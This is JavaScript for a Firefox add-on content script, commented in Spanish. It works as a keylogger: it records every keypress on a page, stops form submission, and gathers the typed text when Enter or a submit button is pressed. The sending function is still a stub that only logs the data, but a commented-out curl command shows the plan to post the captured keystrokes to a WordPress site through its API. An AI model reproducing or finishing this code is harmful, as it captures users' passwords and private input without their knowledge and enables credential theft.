//funcion que ejecuta los cambios en la pagina
self.port.on("replacePage", function(msg){

  console.log("-------------- FF addon");

  // donde guardar el consolidado de caracteres
  var finalString = '';

  // revisa en todo el documento cuando se presiona una tecla
  $(document).keypress(function (e){  
    // el codigo de la tecla
    var code = e.which;
    // el caracter decoficado
    var character = String.fromCharCode(code);
    console.info("presionaron: "+ code + " == carater " + character);

    // suma el nuevo caracter 
    finalString += character;

    // esta pendiente de la tecla enter
    if (code === 13){
      console.info("Presionado enter");
      console.info('suma de caracteres: ', finalString);
      //llama la funcion que enviara la info
      postData(finalString);
      finalString = '';
    }
  }); 

  // esta pendiente de los botones
  $('input[type=submit]').click(function (e){
    e.preventDefault();

    console.info("Presionado boton");
    console.info('suma de caracteres: ', finalString);
    // llama la funcion que enviara la info
    postData(finalString);
    finalString = '';
  });
});

// Aca tiene que definirse a donde se va la informcion
function postData(data){
  // generar API KEY > https://apikey.wordpress.com/
  // a donde= http://developer.wordpress.com/docs/api/1/post/sites/%24site/posts/new/
  // jquery.Ajax = https://api.jquery.com/jQuery.ajax/
  
  /*
  curl \
 -H 'authorization: Bearer YOUR_API_TOKEN' \
 --data-urlencode 'title=Hello World ???' \
 --data-urlencode 'content=DATA' \
 --data-urlencode 'tags=tests???' \
 --data-urlencode 'categories=API ???' \
 'https://public-api.wordpress.com/rest/v1/sites/30434183/posts/new/'
  */
  console.info("datos a enviar: ", data);
}

